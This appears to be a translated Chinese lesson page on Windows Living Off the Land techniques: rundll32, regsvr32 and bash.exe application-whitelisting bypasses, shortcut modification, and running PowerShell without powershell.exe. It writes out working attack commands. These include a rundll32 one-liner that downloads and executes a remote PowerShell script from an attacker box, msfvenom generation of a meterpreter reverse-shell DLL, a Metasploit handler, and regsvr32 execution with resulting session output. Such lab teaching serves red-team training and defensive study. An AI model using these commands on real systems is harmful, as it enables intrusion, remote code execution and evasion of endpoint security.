Y0GBb8HaHQO8IhRiQgRLi5DdCq3c1y83+gk0uFcOgiJiiMH8mlEABhHTsuAqF/hEMKCQIDQE4IgmwQDgAAQ9n/JTgAQAzCAQBgIBwAAAbCAQBgIBwAAAbCAQBgIBwAAAbCAQBgIBwAAAbCAQBgIBwAAAbCAQBgIBwAAAbCAQBgIBwAAAbCAQBgIBwAAAbCAQBgIBwAAAbCAQBgIBwAAAbCAQBgIBwAAAbCAQBgIBwAAAbCAQBgIBwAAAbCAQBg+H/UziansvAuMwAAAABJRU5ErkJggg==" width="391" height="420" class="img_ev3q"></p>
<p><code>rundll32.exe</code> 二进制文件的位置如下：</p>
<ul>
<li>对于 Windows 64 位版本：<code>C:\Windows\System32\rundll32.exe</code></li>
<li>对于 Windows 32 位版本：<code>C:\Windows\SysWOW64\rundll32.exe</code></li>
</ul>
<p>现在，让我们尝试使用 <code>rundll32.exe</code> 二进制文件执行 <code>calc.exe</code> 作为概念验证：</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\thm&gt; rundll32.exe javascript:&quot;\..\mshtml.dll,RunHTMLApplication &quot;;eval(&quot;w=new ActiveXObject(\&quot;WScript.Shell\&quot;);w.run(\&quot;calc\&quot;);window.close()&quot;);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在之前的命令中，我们使用了 <code>rundll32.exe</code> 二进制文件，该文件嵌入了一个 JavaScript 组件 <code>eval()</code>，用于执行 <code>calc.exe</code> 二进制文件，这是一个 Microsoft 计算器。</p>
<p>如前所述，我们还可以使用 <code>rundll32.exe</code> 执行 PowerShell 脚本。以下命令运行一个 JavaScript，它执行一个 PowerShell 脚本，通过 <code>rundll32.exe</code> 从远程网站下载：</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\thm&gt; rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&#x27;http://AttackBox_IP/script.ps1&#x27;);&quot;);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>由于之前的执行，<code>script.ps1</code> 的副本已下载到目标机器的内存中。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="application-whitelisting-bypasses---应用程序白名单绕过">Application Whitelisting Bypasses - 应用程序白名单绕过<a href="#application-whitelisting-bypasses---应用程序白名单绕过" class="hash-link" aria-label="Direct link to Application Whitelisting Bypasses - 应用程序白名单绕过" title="Direct link to Application Whitelisting Bypasses - 应用程序白名单绕过">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="绕过应用程序白名单">绕过应用程序白名单<a href="#绕过应用程序白名单" class="hash-link" aria-label="Direct link to 绕过应用程序白名单" title="Direct link to 绕过应用程序白名单">​</a></h3>
<p>应用程序白名单是 Microsoft 端点安全功能，旨在实时阻止恶意和未经授权的程序执行。应用程序白名单是基于规则的，它指定了一份允许在操作系统上存在和执行的已批准应用程序或可执行文件的列表。本任务重点介绍了用于绕过 Windows 应用程序白名单的 LOLBAS 示例。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="regsvr32">Regsvr32<a href="#regsvr32" class="hash-link" aria-label="Direct link to Regsvr32" title="Direct link to Regsvr32">​</a></h3>
<p>Regsvr32 是 Microsoft 的命令行工具，用于在 Windows 注册表中注册和注销动态链接库（DLL）。<code>regsvr32.exe</code> 二进制文件的位置如下：</p>
<ul>
<li>对于 Windows 32 位版本：<code>C:\Windows\System32\regsvr32.exe</code></li>
<li>对于 Windows 64 位版本：<code>C:\Windows\SysWOW64\regsvr32.exe</code></li>
</ul>
<p>除了其预期用途外，<code>regsvr32.exe</code> 二进制文件还可以用来执行任意二进制文件并绕过 Windows 应用程序白名单。根据 <a href="https://redcanary.com/" target="_blank" rel="noopener noreferrer">Red Canary</a> 的报告，<code>regsvr32.exe</code> 二进制文件是第三大最受欢迎的 <a href="https://attack.mitre.org/techniques/T1218/010/" target="_blank" rel="noopener noreferrer">ATT&amp;CK 技术</a>。对手利用 <code>regsvr32.exe</code> 在本地或远程执行本机代码或脚本。<code>regsvr32.exe</code> 中使用的技术利用了受信任的 Windows 操作系统组件，并在内存中执行，这也是该技术被用来绕过应用程序白名单的原因之一。</p>
<p>让我们尝试在实际操作中应用这一技术。首先，我们需要使用 msvenom 创建一个恶意 DLL 文件，并设置 Metasploit 监听器以接收反向 Shell。请注意，我们将创建一个适用于 32 位操作系统的恶意文件。我们将使用 <code>regsvr32.exe</code> 应用程序白名单绕过技术来在目标系统上运行命令。</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@machine$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 &gt; live0fftheland.dll </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">No encoder specified, outputting raw payload </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: 375 bytes </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Final size of dll file: 8704 bytes </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user@machine$ user@machine$ msfconsole -q </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 &gt; use exploit/multi/handler </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Using configured payload generic/shell_reverse_tcp </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload =&gt; windows/meterpreter/reverse_tcp </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; set LHOST ATTACKBOX_IP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LHOST =&gt; ATTACKBOX_IP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; set LPORT 443 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LPORT =&gt; 443 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; exploit </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Started reverse TCP handler on ATTACKBOX_IP:443 </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>请注意，我们使用 <code>-f</code> 参数指定了输出类型为 DLL。一旦恶意 DLL 文件生成，我们需要将有效载荷传送到受害机器。我们将通过使用一个 web 服务器在我们的攻击机器上提供 DLL 文件，操作如下：</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@machine$ python3 -m http.server 1337</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在受害机器上，访问我们指定的攻击机器上的 1337 端口的 web 服务器。请注意，此端口可以根据您的选择进行更改！</p>
<p>在受害机器上，一旦 DLL 文件下载完成，我们使用 <code>regsvr32.exe</code> 执行它，如下所示：</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\thm&gt; c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">or</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\thm&gt; c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>通过第二个选项，这是一个更高级的命令，我们指示 <code>regsvr32.exe</code> 执行以下操作：</p>
<ul>
<li><code>/s</code>：以静默模式运行（不显示消息）</li>
<li><code>/n</code>：不调用 DLL 注册服务器</li>
<li><code>/i:</code>：使用另一个服务器，因为我们使用了 <code>/n</code></li>
<li><code>/u</code>：以注销方法运行</li>
</ul>
<p>在攻击机器上，我们应该接收到一个反向 Shell。</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 &gt; exploit(multi/handler) &gt; exploit </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Started reverse TCP handler on ATTACKBOX_IP:443 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Sending stage (175174 bytes) to 10.10.159.197 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Meterpreter session 1 opened (ATTACKBOX_IP:443 -&gt; 10.10.159.197:52845 ) at 2022-01-20 05:51:31 -0600</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>请注意，如果我们想创建 64 位 DLL 版本，我们需要在 <code>msfvenom</code> 命令中指定，并使用受害机器上的 64 位 <code>regsvr32.exe</code>（位于 <code>C:\Windows\SysWOW64\regsvr32.exe</code>）来运行。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="bourne-again-shell-bash">Bourne Again Shell (Bash)<a href="#bourne-again-shell-bash" class="hash-link" aria-label="Direct link to Bourne Again Shell (Bash)" title="Direct link to Bourne Again Shell (Bash)">​</a></h3>
<p>在 2016 年，Microsoft 在 Windows 10、11 和 Server 2019 上添加了对 Linux 环境的支持。此功能被称为 Windows 子系统 for Linux（<a href="https://docs.microsoft.com/en-us/windows/wsl/about" target="_blank" rel="noopener noreferrer">WSL</a>），并存在 <a href="https://docs.microsoft.com/en-us/windows/wsl/compare-versions" target="_blank" rel="noopener noreferrer">两个 WSL 版本</a>：WSL1 和 WSL2。WSL 是一个虚拟化的 Linux 发行版，运行在操作系统上，支持部分 Linux 内核和系统调用。此功能是用户可以安装并与 Linux 发行版交互的附加组件。作为 WSL 的一部分，<code>bash.exe</code> 是 Microsoft 用于与 Linux 环境交互的工具。</p>
<p>人们发现了绕过 Windows 应用程序白名单并执行有效载荷的方法，因为它是一个 Microsoft 签名的二进制文件。通过执行 <code>bash.exe -c &quot;path-to-payload&quot;</code>，我们可以执行任何未签名的有效载荷。ATT&amp;CK 将其称为 <strong>间接命令执行</strong> 技术，攻击者利用 Windows 工具实用程序来获取命令执行。有关此技术的更多信息，您可以访问 <a href="https://attack.mitre.org/techniques/T1202/" target="_blank" rel="noopener noreferrer">T1202</a> ATT&amp;CK 网站。</p>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/b0468b54d6174a620d130adb1edacc1c-d66f040d89474531e6d2957d8cc2a396.png" width="991" height="563" class="img_ev3q"></p>
<p>请注意，您需要在 Windows 10 中启用并安装 Windows 子系统 for Linux 才能使用 <code>bash.exe</code> 二进制文件。此外，由于嵌套虚拟化限制，附加的虚拟机未启用 Linux 子系统。</p>
<p>请记住，本节介绍了几个有趣的工具。如果您有兴趣查看可用的 LOLBAS 工具，您可以访问 <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">项目网站</a>。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="other-techniques---其他技术">Other Techniques - 其他技术<a href="#other-techniques---其他技术" class="hash-link" aria-label="Direct link to Other Techniques - 其他技术" title="Direct link to Other Techniques - 其他技术">​</a></h2>
<p>本节突出介绍了一些有趣的技术，这些技术无论是用于初始访问还是持久性，都有其独特的用途。以下技术属于“依赖现有资源”（Living Off the Land）类别，因为它们可以作为 Windows 环境工具的一部分来使用。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="快捷方式">快捷方式<a href="#快捷方式" class="hash-link" aria-label="Direct link to 快捷方式" title="Direct link to 快捷方式">​</a></h3>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/b1b3be212430f23ddaba1f82f2c2a566-6a8a0191ddcf0c8e0d2eb130e28613e1.png" width="360" height="506" class="img_ev3q"></p>
<p>快捷方式或符号链接是一种用于引用操作系统中其他文件或应用程序的技术。当用户点击快捷方式文件时，引用的文件或应用程序将被执行。红队经常利用此技术来获取初始访问权限、特权升级或维持持久性。MITRE ATT&amp;CK 框架将其称为 <strong>快捷方式修改技术</strong> <a href="https://attack.mitre.org/techniques/T1547/009/" target="_blank" rel="noopener noreferrer">T1547</a>，攻击者通过创建或修改快捷方式来利用这一技术。</p>
<p>要使用快捷方式修改技术，我们可以设置目标部分来执行文件，方法包括：</p>
<ul>
<li>Rundll32</li>
<li>Powershell</li>
<li>Regsvr32</li>
<li>磁盘上的可执行文件</li>
</ul>
<p>附图展示了一个快捷方式修改技术的示例，攻击者修改了 Excel 的目标部分，以便使用 <code>rundll32.exe</code> 执行二进制文件。我们选择执行计算器，而不是运行 Excel 应用程序。当受害者点击 Excel 快捷方式图标时，<code>calc.exe</code> 被执行。有关快捷方式修改的更多信息，您可以查看 <a href="https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md" target="_blank" rel="noopener noreferrer">这个</a> GitHub 仓库。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="禁用-powershell">禁用 PowerShell！<a href="#禁用-powershell" class="hash-link" aria-label="Direct link to 禁用 PowerShell！" title="Direct link to 禁用 PowerShell！">​</a></h3>
<p>2019 年，Red Canary 发布了一份威胁检测报告，指出 PowerShell 是恶意活动中使用最广泛的技术。因此，组织开始监控或阻止 <code>powershell.exe</code> 的执行。结果，攻击者找到了其他方法来运行 PowerShell 代码，而不需要直接调用它。<img decoding="async" loading="lazy" alt="img" src="data:image/png;base64,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